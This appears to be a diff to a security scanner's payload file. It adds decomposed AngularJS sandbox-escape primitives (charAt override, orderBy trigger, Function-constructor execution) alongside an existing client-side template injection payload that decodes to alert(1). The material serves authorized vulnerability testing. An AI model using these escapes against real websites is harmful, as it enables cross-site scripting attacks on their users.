@@ -125,3 +125,24 @@ angular_csti:
 angular_no_strings:
   "1.4":
     - 'toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1'
+
+# Primitive building blocks for the DETERMINISTIC in-tool CSTI synthesizer
+# (dast/triage/xss_synthesis.py). These are the DECOMPOSED pieces of the full angular_csti /
+# angular_no_strings vectors above: instead of selecting a canned payload, xss_probe assembles the
+# sandbox escape from these primitives and verifies each piece against the live target's own
+# $parse/$eval (an oracle) before the terminal confirm — no LLM, no gateway. The curated full
+# payloads above stay as the fast first-attempt seed; synthesis is a fallback that runs only after
+# every curated candidate misses. KEEP these in sync with the full vectors (same grammar).
+#   string_builder   fromCharCode(<codes>) reached via toString().constructor → a string w/o literal
+#   charat_override  swaps String.prototype.charAt for Array.join (defeats the sandbox string check)
+#   orderby_trigger  evaluates {EXPR} as the orderBy predicate (reaches the sandboxed evaluator)
+#   function_ctor    Function-constructor code exec (no-sandbox eras 1.0-1.1 / 1.6+ only)
+#   effect_template  the assignment the orderBy trigger evaluates (x=<effect>)
+#   key_suffix       trailing KEY→value separator appended for query-param-KEY delivery
+angular_primitives:
+  string_builder: 'toString().constructor.fromCharCode'
+  charat_override: 'toString().constructor.prototype.charAt=[].join'
+  orderby_trigger: '[1]|orderBy:{EXPR}'
+  function_ctor: 'constructor.constructor({CODE})()'
+  effect_template: 'x={EFFECT}'
+  key_suffix: '=1'
